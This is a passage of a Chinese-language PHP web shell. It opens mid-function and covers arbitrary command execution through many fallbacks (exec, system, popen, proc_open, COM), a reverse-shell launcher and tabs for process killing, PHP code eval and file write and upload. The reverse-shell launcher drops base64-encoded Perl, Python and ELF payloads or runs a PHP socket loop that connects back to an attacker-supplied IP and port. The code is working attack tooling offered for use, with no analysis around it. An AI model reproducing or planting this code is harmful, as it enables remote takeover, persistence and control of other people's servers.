		'\\',
		'//',
		'%27',
		'%22'
	) , array(
		'/',
		'/',
		'\'',
		'"'
	) , chop($str));
}
function filew($filename, $filedata, $filemode) {
	if ((!is_writable($filename)) && file_exists($filename)) {
		chmod($filename, 0666);
	}
	$handle = fopen($filename, $filemode);
	$key = fputs($handle, $filedata);
	fclose($handle);
	return $key;
}
function command($cmd, $cwd, $com = false) {
	$iswin = substr(PHP_OS, 0, 3) == 'WIN' ? true : false;
	$res = $msg2 = '';
	if ($cwd == 'com' || $com) {
		if ($iswin && class_exists('COM')) {
			$wscript = new COM('Wscript.Shell');
			$exec = $wscript->exec('c:\\windows\\system32\\cmd.exe /c ' . $cmd);
			$stdout = $exec->StdOut();
			$res = $stdout->ReadAll();
			$msg2 = 'Wscript.Shell';
		}
	} else {
		chdir($cwd);
		$cwd = getcwd();
		if (function_exists('exec')) {
			@exec($cmd, $res);
			$res = join("\n", $res);
			$msg2 = 'exec';
		} elseif (function_exists('shell_exec')) {
			$res = @shell_exec($cmd);
			$msg2 = 'shell_exec';
		} elseif (function_exists('system')) {
			ob_start();
			@system($cmd);
			$res = ob_get_contents();
			ob_end_clean();
			$msg2 = 'system';
		} elseif (function_exists('passthru')) {
			ob_start();
			@passthru($cmd);
			$res = ob_get_contents();
			ob_end_clean();
			$msg2 = 'passthru';
		} elseif (function_exists('popen')) {
			$fp = @popen($cmd, 'r');
			if ($fp) {
				while (!feof($fp)) {
					$res.= fread($fp, 1024);
				}
			}
			@pclose($fp);
			$msg2 = 'popen';
		} elseif (function_exists('proc_open')) {
			$env = $iswin ? array(
				'path' => 'c:\\windows\\system32'
			) : array(
				'path' => '/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin'
			);
			$des = array(
				0 => array(
					"pipe",
					"r"
				) ,
				1 => array(
					"pipe",
					"w"
				) ,
				2 => array(
					"pipe",
					"w"
				)
			);
			$process = @proc_open($cmd, $des, $pipes, $cwd, $env);
			if (is_resource($process)) {
				fwrite($pipes[0], $cmd);
				fclose($pipes[0]);
				$res.= stream_get_contents($pipes[1]);
				fclose($pipes[1]);
				$res.= stream_get_contents($pipes[2]);
				fclose($pipes[2]);
			}
			@proc_close($process);
			$msg2 = 'proc_open';
		}
	}
	$msg2 = $res == '' ? '<h1>NULL</h1>' : '<h2>利用' . $msg2 . '执行成功</h2>';
	return array(
		'res' => $res,
		'msg' => $msg2
	);
}
function backshell($ip, $port, $dir, $type) {
	$key = false;
	$c_bin = 'f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAYIQECDQAAACkCgAAAAAAADQAIAAHACgAHAAZAAYAAAA0AAAANIAECDSABAjgAAAA4AAAAAUAAAAEAAAAAwAAABQBAAAUgQQIFIEECBMAAAATAAAABAAAAAEAAAABAAAAAAAAAACABAgAgAQIlAcAAJQHAAAFAAAAABAAAAEAAACUBwAAlJcECJSXBAggAQAAKAEAAAYAAAAAEAAAAgAAAKgHAAColwQIqJcECMgAAADIAAAABgAAAAQAAAAEAAAAKAEAACiBBAgogQQIIAAAACAAAAAEAAAABAAAAFHldGQAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAAEAAAAL2xpYi9sZC1saW51eC5zby4yAAAEAAAAEAAAAAEAAABHTlUAAAAAAAIAAAAGAAAACQAAAAIAAAANAAAAAQAAAAUAAAAAIAAgAAAAAA0AAACtS+PAAAAAAAAAAAAAAAAAAAAAAEEAAAAAAAAAdgAAABIAAABJAAAAAAAAAHkBAAASAAAAAQAAAAAAAAAAAAAAIAAAAFUAAAAAAAAAcgEAABIAAABqAAAAAAAAAJ8BAAASAAAANQAAAAAAAABZAQAAEgAAADsAAAAAAAAADgAAABIAAAApAAAAAAAAADwAAAASAAAAUAAAAAAAAAA9AAAAEgAAAF8AAAAAAAAAKwAAABIAAABkAAAAAAAAAG8AAAASAAAAMAAAAAAAAAD0AAAAEgAAABoAAAB4hwQIBAAAABEADgAAX19nbW9uX3N0YXJ0X18AbGliYy5zby42AF9JT19zdGRpbl91c2VkAHNvY2tldABleGl0AGV4ZWNsAGh0b25zAGNvbm5lY3QAZGFlbW9uAGR1cDIAaW5ldF9hZGRyAGF0b2kAY2xvc2UAX19saWJjX3N0YXJ0X21haW4AR0xJQkNfMi4wAAAAAgACAAAAAgACAAIAAgACAAIAAgACAAIAAQAAAAEAAQAQAAAAEAAAAAAAAAAQaWkNAAACAHwAAAAAAAAAcJgECAYDAACAmAQIBwEAAISYBAgHAgAAiJgECAcDAACMmAQIBwQAAJCYBAgHBQAAlJgECAcGAACYmAQIBwcAAJyYBAgHCAAAoJgECAcJAACkmAQIBwoAAKiYBAgHCwAArJgECAcMAABVieWD7AjoBQEAAOiMAQAA6KcDAADJwwD/NXiYBAj/JXyYBAgAAAAA/yWAmAQIaAAAAADp4P////8lhJgECGgIAAAA6dD/////JYiYBAhoEAAAAOnA/////yWMmAQIaBgAAADpsP////8lkJgECGggAAAA6aD/////JZSYBAhoKAAAAOmQ/////yWYmAQIaDAAAADpgP////8lnJgECGg4AAAA6XD/////JaCYBAhoQAAAAOlg/////yWkmAQIaEgAAADpUP////8lqJgECGhQAAAA6UD/////JayYBAhoWAAAAOkw////AAAAADHtXonhg+TwUFRSaLCGBAhowIYECFFWaDSFBAjoW/////SQkFWJ5VOD7AToAAAAAFuBw+QTAACLk/z///+F0nQF6Bb///9YW8nDkJCQkJCQVYnlU4PsBIA9uJgECAB1P7iglwQILZyXBAjB+AKNWP+htJgECDnDdh+NtCYAAAAAg8ABo7SYBAj/FIWclwQIobSYBAg5w3foxgW4mAQIAYPEBFtdw410JgCNvCcAAAAAVYnlg+wIoaSXBAiFwHQSuAAAAACFwHQJxwQkpJcECP/QycOQjUwkBIPk8P9x/FWJ5VdTUYPsPInLx0QkBAAAAADHBCQBAAAA6E/+//9mx0XgAgCLQwSDwAiLAIkEJOi5/v//D7fAiQQk6H7+//9miUXii0MEg8AEiwCJBCToOv7//4lF5ItDBIPABIsAuf////+JRdC4AAAAAPyLfdDyronI99CNUP+LQwSDwAiLALn/////iUXMuAAAAAD8i33M8q6JyPfQg+gBjQQCjVABi0MEg8AEiwCJx/yJ0bgAAAAA86rHRCQIBgAAAMdEJAQBAAAAxwQkAgAAAOj9/f//iUXwjUXgx0QkCBAAAACJRCQEi0XwiQQk6HD9//+FwHkMxwQkAAAAAOgQ/v//x0QkBAAAAACLRfCJBCTozf3//8dEJAQBAAAAi0XwiQQk6Lr9///HRCQEAgAAAItF8IkEJOin/f//x0QkCAAAAADHRCQEgIcECMcEJIaHBAjoW/3//4tF8IkEJOig/f//g8Q8WVtfXY1h/MOQkJCQkJCQkJBVieVdw410JgCNvCcAAAAAVYnlV1ZT6F4AAACBw6kRAACD7Bzom/z//42DIP///4lF8I2DIP///ylF8MF98AKLVfCF0nQrMf+Jxo22AAAAAItFEIPHAYlEJAiLRQyJRCQEi0UIiQQk/xaDxgQ5ffB134PEHFteX13Dixwkw5CQkFWJ5VO7lJcECIPsBKGUlwQIg/j/dAyD6wT/0IsDg/j/dfSDxARbXcNVieVTg+wE6AAAAABbgcMQEQAA6ED9//9ZW8nDAwAAAAEAAgAAAAAAc2ggLWkAL2Jpbi9zaAAAAAAAAAD/////AAAAAP////8AAAAAAAAAAAEAAAAQAAAADAAAAHSDBAgNAAAAWIcECPX+/29IgQQIBQAAAEiCBAgGAAAAaIEECAoAAACGAAAACwAAABAAAAAVAAAAAAAAAAMAAAB0mAQIAgAAAGAAAAAUAAAAEQAAABcAAAAUgwQIEQAAAAyDBAgSAAAACAAAABMAAAAIAAAA/v//b+yCBAj///9vAQAAAPD//2/OggQIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKiXBAgAAAAAAAAAAKKDBAiygwQIwoMECNKDBAjigwQI8oMECAKEBAgShAQIIoQECDKEBAhChAQIUoQECAAAAAAAR0NDOiAoR05VKSA0LjEuMiAyMDA4MDcwNCAoUmVkIEhhdCA0LjEuMi00NikAAEdDQzogKEdOVSkgNC4xLjIgMjAwODA3MDQgKFJlZCBIYXQgNC4xLjItNDYpAABHQ0M6IChHTlUpIDQuMS4yIDIwMDgwNzA0IChSZWQgSGF0IDQuMS4yLTQ4KQAAR0NDOiAoR05VKSA0LjEuMiAyMDA4MDcwNCAoUmVkIEhhdCA0LjEuMi00OCkAAEdDQzogKEdOVSkgNC4xLjIgMjAwODA3MDQgKFJlZCBIYXQgNC4xLjItNDgpAABHQ0M6IChHTlUpIDQuMS4yIDIwMDgwNzA0IChSZWQgSGF0IDQuMS4yLTQ2KQAALnN5bXRhYgAuc3RydGFiAC5zaHN0cnRhYgAuaW50ZXJwAC5ub3RlLkFCSS10YWcALmdudS5oYXNoAC5keW5zeW0ALmR5bnN0cgAuZ251LnZlcnNpb24ALmdudS52ZXJzaW9uX3IALnJlbC5keW4ALnJlbC5wbHQALmluaXQALnRleHQALmZpbmkALnJvZGF0YQAuZWhfZnJhbWUALmN0b3JzAC5kdG9ycwAuamNyAC5keW5hbWljAC5nb3QALmdvdC5wbHQALmRhdGEALmJzcwAuY29tbWVudAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAABAAAAAgAAABSBBAgUAQAAEwAAAAAAAAAAAAAAAQAAAAAAAAAjAAAABwAAAAIAAAAogQQIKAEAACAAAAAAAAAAAAAAAAQAAAAAAAAAMQAAAPb//28CAAAASIEECEgBAAAgAAAABAAAAAAAAAAEAAAABAAAADsAAAALAAAAAgAAAGiBBAhoAQAA4AAAAAUAAAABAAAABAAAABAAAABDAAAAAwAAAAIAAABIggQISAIAAIYAAAAAAAAAAAAAAAEAAAAAAAAASwAAAP///28CAAAAzoIECM4CAAAcAAAABAAAAAAAAAACAAAAAgAAAFgAAAD+//9vAgAAAOyCBAjsAgAAIAAAAAUAAAABAAAABAAAAAAAAABnAAAACQAAAAIAAAAMgwQIDAMAAAgAAAAEAAAAAAAAAAQAAAAIAAAAcAAAAAkAAAACAAAAFIMECBQDAABgAAAABAAAAAsAAAAEAAAACAAAAHkAAAABAAAABgAAAHSDBAh0AwAAFwAAAAAAAAAAAAAABAAAAAAAAAB0AAAAAQAAAAYAAACMgwQIjAMAANAAAAAAAAAAAAAAAAQAAAAEAAAAfwAAAAEAAAAGAAAAYIQECGAEAAD4AgAAAAAAAAAAAAAQAAAAAAAAAIUAAAABAAAABgAAAFiHBAhYBwAAHAAAAAAAAAAAAAAABAAAAAAAAACLAAAAAQAAAAIAAAB0hwQIdAcAABoAAAAAAAAAAAAAAAQAAAAAAAAAkwAAAAEAAAACAAAAkIcECJAHAAAEAAAAAAAAAAAAAAAEAAAAAAAAAJ0AAAABAAAAAwAAAJSXBAiUBwAACAAAAAAAAAAAAAAABAAAAAAAAACkAAAAAQAAAAMAAACclwQInAcAAAgAAAAAAAAAAAAAAAQAAAAAAAAAqwAAAAEAAAADAAAApJcECKQHAAAEAAAAAAAAAAAAAAAEAAAAAAAAALAAAAAGAAAAAwAAAKiXBAioBwAAyAAAAAUAAAAAAAAABAAAAAgAAAC5AAAAAQAAAAMAAABwmAQIcAgAAAQAAAAAAAAAAAAAAAQAAAAEAAAAvgAAAAEAAAADAAAAdJgECHQIAAA8AAAAAAAAAAAAAAAEAAAABAAAAMcAAAABAAAAAwAAALCYBAiwCAAABAAAAAAAAAAAAAAABAAAAAAAAADNAAAACAAAAAMAAAC0mAQItAgAAAgAAAAAAAAAAAAAAAQAAAAAAAAA0gAAAAEAAAAAAAAAAAAAALQIAAAUAQAAAAAAAAAAAAABAAAAAAAAABEAAAADAAAAAAAAAAAAAADICQAA2wAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAgAAAAAAAAAAAAAABA8AANAEAAAbAAAAMAAAAAQAAAAQAAAACQAAAAMAAAAAAAAAAAAAANQTAAD1AgAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFIEECAAAAAADAAEAAAAAACiBBAgAAAAAAwACAAAAAABIgQQIAAAAAAMAAwAAAAAAaIEECAAAAAADAAQAAAAAAEiCBAgAAAAAAwAFAAAAAADOggQIAAAAAAMABgAAAAAA7IIECAAAAAADAAcAAAAAAAyDBAgAAAAAAwAIAAAAAAAUgwQIAAAAAAMACQAAAAAAdIMECAAAAAADAAoAAAAAAIyDBAgAAAAAAwALAAAAAABghAQIAAAAAAMADAAAAAAAWIcECAAAAAADAA0AAAAAAHSHBAgAAAAAAwAOAAAAAACQhwQIAAAAAAMADwAAAAAAlJcECAAAAAADABAAAAAAAJyXBAgAAAAAAwARAAAAAACklwQIAAAAAAMAEgAAAAAAqJcECAAAAAADABMAAAAAAHCYBAgAAAAAAwAUAAAAAAB0mAQIAAAAAAMAFQAAAAAAsJgECAAAAAADABYAAAAAALSYBAgAAAAAAwAXAAAAAAAAAAAAAAAAAAMAGAABAAAAhIQECAAAAAACAAwAEQAAAAAAAAAAAAAABADx/xwAAACUlwQIAAAAAAEAEAAqAAAAnJcECAAAAAABABEAOAAAAKSXBAgAAAAAAQASAEUAAAC0mAQIBAAAAAEAFwBTAAAAuJgECAEAAAABABcAYgAAALCEBAgAAAAAAgAMAHgAAAAQhQQIAAAAAAIADAARAAAAAAAAAAAAAAAEAPH/hAAAAJiXBAgAAAAAAQAQAJEAAACQhwQIAAAAAAEADwCfAAAApJcECAAAAAABABIAqwAAADCHBAgAAAAAAgAMAMEAAAAAAAAAAAAAAAQA8f/GAAAAlJcECAAAAAAAAhAA3AAAAJSXBAgAAAAAAAIQAO0AAAB0mAQIAAAAAAECFQADAQAAlJcECAAAAAAAAhAAFwEAAJSXBAgAAAAAAAIQACoBAACUlwQIAAAAAAACEAA7AQAAlJcECAAAAAAAAhAATgEAAKiXBAgAAAAAAQITAFcBAACwmAQIAAAAACAAFgBiAQAAAAAAAHYAAAASAAAAdQEAAAAAAAB5AQAAEgAAAIcBAACwhgQIBQAAABIADACXAQAAYIQECAAAAAASAAwAngEAAAAAAAAAAAAAIAAAAK0BAAAAAAAAAAAAACAAAADBAQAAdIcECAQAAAARAA4AyAEAAFiHBAgAAAAAEgANAM4BAAAAAAAAcgEAABIAAADjAQAAAAAAAJ8BAAASAAAAAAIAAAAAAABZAQAAEgAAABECAAAAAAAADgAAABIAAAAiAgAAeIcECAQAAAARAA4AMQIAALCYBAgAAAAAEAAWAD4CAAAAAAAAPAAAABIAAABQAgAAAAAAAD0AAAASAAAAYAIAAHyHBAgAAAAAEQIOAG0CAACglwQIAAAAABECEQB6AgAAwIYECGkAAAASAAwAigIAAAAAAAArAAAAEgAAAJoCAAAAAAAAbwAAABIAAACrAgAAtJgECAAAAAAQAPH/twIAALyYBAgAAAAAEADx/7wCAAC0mAQIAAAAABAA8f/DAgAAAAAAAPQAAAASAAAA0wIAACmHBAgAAAAAEgIMAOoCAAA0hQQIcwEAABIADADvAgAAdIMECAAAAAASAAoAAGNhbGxfZ21vbl9zdGFydABjcnRzdHVmZi5jAF9fQ1RPUl9MSVNUX18AX19EVE9SX0xJU1RfXwBfX0pDUl9MSVNUX18AZHRvcl9pZHguNTc5MwBjb21wbGV0ZWQuNTc5MQBfX2RvX2dsb2JhbF9kdG9yc19hdXgAZnJhbWVfZHVtbXkAX19DVE9SX0VORF9fAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kb19nbG9iYWxfY3RvcnNfYXV4AGJjLmMAX19wcmVpbml0X2FycmF5X3N0YXJ0AF9fZmluaV9hcnJheV9lbmQAX0dMT0JBTF9PRkZTRVRfVEFCTEVfAF9fcHJlaW5pdF9hcnJheV9lbmQAX19maW5pX2FycmF5X3N0YXJ0AF9faW5pdF9hcnJheV9lbmQAX19pbml0X2FycmF5X3N0YXJ0AF9EWU5BTUlDAGRhdGFfc3RhcnQAY29ubmVjdEBAR0xJQkNfMi4wAGRhZW1vbkBAR0xJQkNfMi4wAF9fbGliY19jc3VfZmluaQBfc3RhcnQAX19nbW9uX3N0YXJ0X18AX0p2X1JlZ2lzdGVyQ2xhc3NlcwBfZnBfaHcAX2ZpbmkAaW5ldF9hZGRyQEBHTElCQ18yLjAAX19saWJjX3N0YXJ0X21haW5AQEdMSUJDXzIuMABleGVjbEBAR0xJQkNfMi4wAGh0b25zQEBHTElCQ18yLjAAX0lPX3N0ZGluX3VzZWQAX19kYXRhX3N0YXJ0AHNvY2tldEBAR0xJQkNfMi4wAGR1cDJAQEdMSUJDXzIuMABfX2Rzb19oYW5kbGUAX19EVE9SX0VORF9fAF9fbGliY19jc3VfaW5pdABhdG9pQEBHTElCQ18yLjAAY2xvc2VAQEdMSUJDXzIuMABfX2Jzc19zdGFydABfZW5kAF9lZGF0YQBleGl0QEBHTElCQ18yLjAAX19pNjg2LmdldF9wY190aHVuay5ieABtYWluAF9pbml0AA==';
	switch ($type) {
		case "pl":
			$shell = 'IyEvdXNyL2Jpbi9wZXJsIC13DQojIA0KdXNlIHN0cmljdDsNCnVzZSBTb2NrZXQ7DQp1c2UgSU86OkhhbmRsZTsNCm15ICRzcGlkZXJfaXAgPSAkQVJHVlswXTsNCm15ICRzcGlkZXJfcG9ydCA9ICRBUkdWWzFdOw0KbXkgJHByb3RvID0gZ2V0cHJvdG9ieW5hbWUoInRjcCIpOw0KbXkgJHBhY2tfYWRkciA9IHNvY2thZGRyX2luKCRzcGlkZXJfcG9ydCwgaW5ldF9hdG9uKCRzcGlkZXJfaXApKTsNCm15ICRzaGVsbCA9ICcvYmluL3NoIC1pJzsNCnNvY2tldChTT0NLLCBBRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKTsNClNURE9VVC0+YXV0b2ZsdXNoKDEpOw0KU09DSy0+YXV0b2ZsdXNoKDEpOw0KY29ubmVjdChTT0NLLCRwYWNrX2FkZHIpIG9yIGRpZSAiY2FuIG5vdCBjb25uZWN0OiQhIjsNCm9wZW4gU1RESU4sICI8JlNPQ0siOw0Kb3BlbiBTVERPVVQsICI+JlNPQ0siOw0Kb3BlbiBTVERFUlIsICI+JlNPQ0siOw0Kc3lzdGVtKCRzaGVsbCk7DQpjbG9zZSBTT0NLOw0KZXhpdCAwOw0K';
			$file = strdir($dir . '/05.pl');
			$key = filew($file, base64_decode($shell) , 'w');
			if ($key) {
				@chmod($file, 0777);
				command('/usr/bin/perl ' . $file . ' ' . $ip . ' ' . $port, $dir);
			}
			break;
			
		case "py":
			$shell = 'IyEvdXNyL2Jpbi9weXRob24NCiMgDQppbXBvcnQgc3lzLG9zLHNvY2tldCxwdHkNCnMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pDQpzLmNvbm5lY3QoKHN5cy5hcmd2WzFdLCBpbnQoc3lzLmFyZ3ZbMl0pKSkNCm9zLmR1cDIocy5maWxlbm8oKSwgc3lzLnN0ZGluLmZpbGVubygpKQ0Kb3MuZHVwMihzLmZpbGVubygpLCBzeXMuc3Rkb3V0LmZpbGVubygpKQ0Kb3MuZHVwMihzLmZpbGVubygpLCBzeXMuc3RkZXJyLmZpbGVubygpKQ0KcHR5LnNwYXduKCcvYmluL3NoJykNCg==';
			$file = strdir($dir . '/05.py');
			$key = filew($file, base64_decode($shell) , 'w');
			if ($key) {
				@chmod($file, 0777);
				command('/usr/bin/python ' . $file . ' ' . $ip . ' ' . $port, $dir);
			}
			break;
			
		case "c":
			$file = strdir($dir . '/05');
			$key = filew($file, base64_decode($c_bin) , 'wb');
			if ($key) {
				@chmod($file, 0777);
				command($file . ' ' . $ip . ' ' . $port, $dir);
			}
			break;
			
		case "php":
		case "phpwin":
			if (function_exists('fsockopen')) {
				$sock = @fsockopen($ip, $port);
				if ($sock) {
					$key = true;
					$com = $type == 'phpwin' ? true : false;
					$user = get_current_user();
					$dir = strdir(getcwd());
					fputs($sock, php_uname() . "\n*********************************************\n 
		              hacking 05 is ok!        
			          \n*********************************************\n\n[$user:$dir]# ");
					while ($cmd = fread($sock, 1024)) {
						if (substr($cmd, 0, 3) == 'cd ') {
							$dir = trim(substr($cmd, 3, -1));
							chdir(strdir($dir));
							$dir = strdir(getcwd());
						} elseif (trim(strtolower($cmd)) == 'exit') {
							break;
						} else {
							$res = command($cmd, $dir, $com);
							fputs($sock, $res['res']);
						}
						fputs($sock, '[' . $user . ':' . $dir . ']# ');
					}
				}
				@fclose($sock);
			}
			break;
			
		case "pcntl":
			$file = strdir($dir . '/05');
			$key = filew($file, base64_decode($c_bin) , 'wb');
			if ($key) {
				@chmod($file, 0777);
				if (function_exists('pcntl_exec')) {
					@pcntl_exec($file, array(
						$ip,
						$port
					));
				}
			}

			break;
	}
	if (!$key) {
		$msg2 = '<h1>临时目录不可写</h1>';
	} else {
		@unlink($file);
		$msg2 = '<h2>CLOSE</h2>';
	}
	return $msg2;
}
if ((!empty($_POST['backip'])) && (!empty($_POST['backport']))) {
            $backip = $_POST['backip'];
            $backport = $_POST['backport'];
            $temp = $_POST['temp'] ? $_POST['temp'] : '/tmp';
            $type = $_POST['type'];
            $msg2 = backshell($backip, $backport, $temp, $type);
        } else {
            $backip = $_SERVER['REMOTE_ADDR'];
            $backport = '12305';
            $temp = '/tmp';
            $type = 'pl';
        }
        echo '<div class="Nc">' . $msg2 . '</div>';
        echo '<form method="POST">';
        
        echo '<input type="hidden" name="go" id="go" value="backshell">';
        echo '<table class="tables"><tr><th style="width:15%;">名称</th><th>设置</th></tr>';
        echo '<tr><td>反弹地址</td><td><input type="text" name="backip" style="width:268px;" value="' . $backip . '"> (Your ip)</td></tr>';
        echo '<tr><td>反弹端口</td><td><input type="text" name="backport" style="width:268px;" value="' . $backport . '"> (nc -vv -l ' . $backport . ')</td></tr>';
        echo '<tr><td>临时目录</td><td><input type="text" name="temp" style="width:268px;" value="' . $temp . '"> (Only Linux)</td></tr>';
        echo '<tr><td>反弹方法</td><td>';
        $types = array(
            'pl' => 'Perl',
            'py' => 'Python',
            'c' => 'C-bin',
            'pcntl' => 'Pcntl',
            'php' => 'PHP',
            'phpwin' => 'PHP-WS'
        );
        foreach ($types as $key => $name) {
            echo '<label><input type="radio" name="type" value="' . $key . '"' . ($key == $type ? ' checked' : '') . '>' . $name . '</label> ';
        }
        echo '</td></tr><tr><td>操作</td><td><input type="submit" style="width:80px;" value="反弹"></td></tr>';
        echo '</table></form>';
        
?>


</div>   
<!--nc -lvp End--->

<!--kill ps Start--->
<div class="tab" data-tab="Kill Ps" <?php echo $tab=='Kill Ps' ? 'style="visibility: visible"' : ''?>>
	<?php
		
		printf("<div id='process-kill'><form class='new' style='width: 200px;' method='post' action='?xa=kill'>
					<label>PID</label> <input type='text' name='pid'/>
					<input type='submit' value='Kill'/><br>
					<label>Name</label> <input type='text' name='name'/>
					<input type='submit' value='Kill'/>
				</form></div>");

		if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="kill")
		{
			$pid=$_REQUEST['pid'];
			$name=$_REQUEST['name'];

			if(Unix())
			{
				$kill=Execute("kill 9 $pid");
				$kill=Execute("kill 9 $name");
				if($kill) print '<font class="off">Process Killed</font>';
			}
			else
			{
				$kill=Execute("taskkill /f /pid $pid");
				$kill=Execute("taskkill /f /im $name");
				if($kill) print '<font class="off">Process Killed</font>';
			}
		}

		if(Unix())
		{
			$ret=iconv('UTF-8','UTF-8',Execute('ps aux'));
			
			print '<div id="process-list"><pre>'.$ret.'</pre></div>';
		}
		else
		{
			$ret=iconv('Windows-1251','UTF-8',Execute('tasklist'));
			print '<div id="process-list"><pre>'.$ret.'</pre></div>';
		}
	?>
</div>
<!--kill ps End--->
<!--PHP Start--->
<div class="tab" data-tab="PHP" <?php echo $tab=='PHP' ? 'style="visibility: visible"' : ''?>>
	<?php
	$exp=array(
			"print_r(get_extension_funcs('Core'));",
			"print_r(get_loaded_extensions());",
			"print_r(ini_get_all('pcre'));",
			"print_r(ini_get_all());",
			"print_r(get_defined_constants());",
			"print_r(get_defined_functions());",
			"print_r(get_declared_classes());");
		
		printf("<div id='php'>
					<form onsubmit='return false;'>
						<div class='php-left'>
							<textarea id='php-code' cols='122' rows='20'>%s</textarea>
						</div>
						<div class='php-right'>
							<textarea id='php-eval' cols='122' rows='20' readonly></textarea>
						</div>
						<input type='submit' id='php-submit' onclick=\"getAjax(false,'php-eval','POST','?codex='+document.getElementById('php-code').value);\" class='php-code' name=php-code cols=122 rows=20 value='Inject'/>
						<input type='submit' id='php-submit' onclick=\"getAjax(false,'php-eval','POST','?code='+document.getElementById('php-code').value);\" class='php-code' name=php-code cols=122 rows=20 value='Run'/>
					</form>
				</div>",implode($exp,"\n"));

		if(any("code",$_REQUEST))
		{
			ob_clean();
			$code=trim($_REQUEST['code']);
			$evil=Evil($code);
			exit;
		}
		if(any("codex",$_REQUEST))
		{
			ob_clean();
			$code=trim($_REQUEST['codex']);
			$evil=Evil($code,true);
			exit;
		}
		?>
</div>
<!--PHP End--->

<!--UpFile Start--->
<div class="tab" data-tab="UpFile" <?php echo $tab=='UpFile' ? 'style="visibility: visible"' : ''?>>
<html>
<?php echo "</br>本程序的路径: ".__FILE__.
"</br>服务器操作系统: ".PHP_OS.
"</br>服务器IP地址: ".gethostbyname($_SERVER["SERVER_NAME"]).
"</br>PHP版本: ".PHP_VERSION;
?>
<form action = <?php echo strrchr(__FILE__,"\\"); ?> method="post">
要提交的数据：</br>
<textarea type="text" name="data" rows="10" cols="30">
</textarea>
</br>
保存路径：<input type="text" name="dir" />
</br>
<br><button type="submit" value="提交" style="display:block;margin:0 auto">提交</button>
</form>
</html>
<?php

if(strlen($_POST["data"])>0 && strlen($_POST["dir"])>0)
{
$p_File=fopen($_POST["dir"],"a");
if(!$p_File)
echo "写入失败！请换个目录试试！";
else
echo "Ok！！ ";
fputs($p_File,$_POST["data"]);
fclose($p_File);
}
else
echo "请把数据填写完整！";
?> 
</div>
<!--UpFile End--->
<!--UpFile2 Start--->
<div class="tab" data-tab="UpFile2" <?php echo $tab=='UpFile2' ? 'style="visibility: visible"' : ''?>>
<html>
<head>
<meta charset="utf-8">
</head>
<body>

<form action="<?php echo $_SERVER['PHP_SELF'];?>" method="post" enctype="multipart/form-data">
    <label for="file">filename：</label>
    <input type="file" name="file" id="file"><br>
    <button type="submit" value="提交" style="display:block;margin:0 auto">提交</button>
</form>

</body>
</html>
<?php
if ($_FILES["file"]["error"] > 0)
{
    echo "Error：" . $_FILES["file"]["error"] . "<br>";
}
else
{
	$filename=$_FILES['file']['name'];
    $tmp_name=$_FILES['file']['tmp_name'];
    echo "filename: " . $_FILES["file"]["name"] . "<br>";
    echo "filetype: " . $_FILES["file"]["type"] . "<br>";
    echo "filesize: " . ($_FILES["file"]["size"] / 1024) . " kB<br>";
    echo "file location: " . $filename;
    move_uploaded_file($tmp_name, $filename);
}
?>
</div>
<!--UpFile2 End--->
<script>
	document.addEventListener('drop', (event) => { 
			document.getElementById('file').files = event.dataTransfer.files; 
			event.preventDefault(); 
			fileForm.submit(); 
		}, false);
	document.addEventListener('dragover', (event) => { event.preventDefault(); }, false);
	function del(target, event){
		event.stopPropagation();
		if(confirm("delete "+target.split(/[\\/]/).pop()+" ?")) {
			document.getElementById('rm').value = target;
			fileForm.submit();
		}
	}
	function edit(target, event){
		event.stopPropagation();
		document.getElementById('edit').value = target;
		document.cookie="tab=edit";
		editForm.submit();
	}
	function setexecfn(fn){
		document.cookie="execfn="+fn;
	}
	function showTab(tab, btn){
		let tabs = document.getElementsByClassName("tab");
		let btns = document.getElementsByClassName("tab-btn");
		for(let i=0;i<btns.length;i++){
			btns[i].classList.remove('active');
		}
		btn.classList.add('active');
		document.cookie="tab="+tab;
		for(var i=0;i<tabs.length;i++){
			if(tabs[i].dataset.tab==tab){
				tabs[i].style.visibility="visible";
			}
			else {
				tabs[i].style.visibility="hidden";
			}
		}
	}
	function resize(element) {
		element.style.height = "auto";
		element.style.height = element.scrollHeight;
	}
	document.querySelectorAll('textarea[readonly]').forEach(e=>{resize(e);})
</script>
</body>
</html>